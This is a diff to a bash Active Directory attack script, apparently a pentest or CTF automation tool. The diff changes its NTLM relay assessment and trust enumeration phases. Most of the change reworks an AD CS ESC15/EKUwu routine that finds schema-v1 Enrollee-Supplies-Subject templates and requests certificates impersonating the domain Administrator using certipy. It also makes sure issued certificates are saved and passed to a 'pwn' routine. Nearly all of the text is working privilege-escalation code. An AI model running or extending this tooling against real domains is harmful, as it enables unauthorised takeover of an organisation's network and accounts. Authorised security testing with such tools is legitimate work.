@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.15.1"
+readonly VERSION="1.16.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -1079,8 +1079,13 @@ phase_secrets() {
 #  (relaying is interactive: we DETECT + hand you the exact commands, we don't
 #   blindly fire listeners mid-scan)
 # ===========================================================================
+RELAY_DONE=0
 phase_relay() {
     [[ "$HAVE_AUTH" != "1" || "$CAP_SMB" != "1" ]] && return
+    # SMB/LDAP signing, coercion vectors, spooler/webdav and the relay playbook are
+    # DC-wide facts — identical for every identity. Assess once, not per pivot.
+    [[ "$RELAY_DONE" == "1" ]] && return
+    RELAY_DONE=1
     section "NTLM RELAY & COERCION ASSESSMENT"
     local args; mapfile -t args < <(nxc_cred_args)
     local lhost; lhost=$(ip route get "$DC_IP" 2>/dev/null | grep -oP 'src \K\S+' | head -1)
@@ -1145,8 +1150,12 @@ phase_relay() {
 # ===========================================================================
 #  DOMAIN / FOREST TRUSTS  —  enumerate and surface cross-forest attack paths
 # ===========================================================================
+TRUSTS_DONE=0
 phase_trusts() {
     [[ "$HAVE_AUTH" != "1" ]] && return
+    # Domain/forest trusts are domain-wide — same for every identity. Enumerate once.
+    [[ "$TRUSTS_DONE" == "1" ]] && return
+    TRUSTS_DONE=1
     section "TRUSTS · DOMAIN & CROSS-FOREST RELATIONSHIPS"
     [[ "$CAP_LDAP" != "1" ]] && { warn "LDAP not exposed → trust enumeration needs LDAP, skipping"; return; }
     local args; mapfile -t args < <(nxc_cred_args)
@@ -1741,9 +1750,11 @@ _adcs_req_admin() {                     # _adcs_req_admin <ca> <tpl> <label> <wi
     local rargs=(req "${_ADCS_AUTH[@]}" -ca "$ca" -template "$tpl" -upn "administrator@${DOMAIN}" \
                  "${sidargs[@]}" -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" "$@")
     run "certipy ${rargs[*]}"
-    local out; out=$( cd "$OUTDIR" && "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" </dev/null 2>&1 ); echo "$out" | tee -a "$LOGFILE"
-    # certipy names the PFX after the ISSUED identity (often the requester, not the
-    # impersonated UPN if the template forbids the SAN) — read the real filename.
+    # Pipe 'y' (yes): certipy asks "Overwrite? (y/n)" when a prior attempt left a
+    # PFX, and "save private key? (y/N)" on a failed request — `</dev/null` made
+    # those EOF and we LOST a freshly-issued cert. `yes` answers them so the cert
+    # is always written, then we read its real filename from certipy's own output.
+    local out; out=$( cd "$OUTDIR" && yes 2>/dev/null | "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy "${rargs[@]}" 2>&1 ); echo "$out" | tee -a "$LOGFILE"
     local pfx; pfx=$(grep -oiP "(?:Saving|Wrote) certificate and private key to '\K[^']+" <<<"$out" | tail -1 | xargs -r basename)
     _adcs_pwn_pfx "$pfx" "$label"
 }
@@ -1830,25 +1841,28 @@ _adcs_relay() {
 _adcs_esc15_blind() {
     local ca="$1"; have certipy || return 1
     _adcs_setauth
-    subsection "ESC15/EKUwu check — v1 templates ${USER} can enrol (certipy doesn't flag these)"
+    _ADCS_SID="$(_adcs_admin_sid)"   # cert must carry Administrator's SID (strong mapping)
+    subsection "ESC15/EKUwu check — schema-v1 'Enrollee-Supplies-Subject' templates"
     local full; full=$( "${_ADCS_ENV[@]}" timeout -k 15 "${CERTIPY_TO:-120}" certipy find "${_ADCS_AUTH[@]}" \
-        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout -enabled 2>&1 )
-    # principals that mean "we can enrol": broad ones + us + our groups
-    local princ="Authenticated Users|Domain Users|Domain Computers|${USER}"
-    local g="${OWNED_GROUPS[${USER,,}]:-}"
-    [[ -n "$g" && "$g" != "—" ]] && princ="${princ}|$(sed 's/, */|/g' <<<"$g")"
-    # keep Template Names whose block is Schema Version 1 AND lists an enrolable principal
-    local tpls; tpls=$(awk -v p="$princ" 'BEGIN{IGNORECASE=1}
-        /Template Name/{ if(name!="" && v1 && enr) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); v1=0; enr=0 }
+        -dc-ip "$DC_IP" -target "${DC_FQDN:-$DCT}" -stdout -enabled </dev/null 2>&1 )
+    # ESC15 needs a SCHEMA-VERSION-1 template that lets the ENROLLEE SUPPLY THE
+    # SUBJECT — only then does our -upn administrator take effect (otherwise the
+    # cert is issued for us and is useless: "not valid for client authentication").
+    # v1 + ESS = WebServer/SubCA-class. Parsed dynamically — no hard-coded names.
+    # We don't pre-filter by enrolment rights (they can hide behind unresolved
+    # SIDs); the certipy req itself is the real enrolment test (DENIED vs issued).
+    local tpls; tpls=$(awk 'BEGIN{IGNORECASE=1}
+        /Template Name/{ if(name!="" && v1 && ess) print name; name=$0; sub(/.*:[[:space:]]*/,"",name); v1=0; ess=0 }
         /Schema Version.*:[[:space:]]*1[[:space:]]*$/{ v1=1 }
-        p!="" && $0 ~ p { enr=1 }
-        END{ if(name!="" && v1 && enr) print name }' <<<"$full" | sed 's/[[:space:]]*$//' | sort -u)
-    [[ -z "$tpls" ]] && { info "  no enrollable v1 template for ${USER} → ESC15 not applicable as this identity"; return 1; }
+        /Enrollee Supplies Subject.*:[[:space:]]*True/{ ess=1 }
+        /EnrolleeSuppliesSubject/{ ess=1 }
+        END{ if(name!="" && v1 && ess) print name }' <<<"$full" | sed 's/[[:space:]]*$//' | sort -u)
+    [[ -z "$tpls" ]] && { info "  no v1 Enrollee-Supplies-Subject template → ESC15 not applicable here"; return 1; }
     local t n=0
     while IFS= read -r t; do
         [[ -z "$t" ]] && continue
-        (( n++ >= 6 )) && break
-        loot "ESC15 candidate: v1 template '${t}' enrollable by ${USER} → trying EKUwu"
+        (( n++ >= 5 )) && break
+        loot "ESC15 candidate: v1+ESS template '${t}' → requesting an Administrator cert (EKUwu)"
         _adcs_req_admin "$ca" "$t" "ESC15(EKUwu)" 1 -application-policies 'Client Authentication' && return 0
     done <<<"$tpls"
     return 1
